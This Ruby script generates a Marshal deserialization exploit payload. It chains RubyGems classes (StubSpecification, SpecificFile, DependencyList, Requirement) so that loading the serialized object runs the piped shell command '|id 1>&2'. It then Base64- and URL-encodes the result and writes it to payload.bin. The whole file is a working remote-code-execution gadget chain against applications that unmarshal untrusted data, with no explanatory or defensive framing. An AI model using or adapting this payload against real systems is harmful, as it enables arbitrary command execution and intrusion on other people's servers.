#!/usr/bin/env ruby

class Gem::StubSpecification
  def initialize; end
end


stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")

stub_specification.name rescue nil

class Gem::Source::SpecificFile
  def initialize; end
end

specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)

other_specific_file = Gem::Source::SpecificFile.new

specific_file <=> other_specific_file rescue nil


$dependency_list= Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

$dependency_list.each{} rescue nil


class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)


require "base64"
puts "Payload (Base64 encoded):"
encoded_payload = URI.escape(Base64.encode64(payload).split("\n").join())
puts encoded_payload
File.open("payload.bin", 'w') { |file| file.write(encoded_payload) }
puts "Payload written to payload.bin"
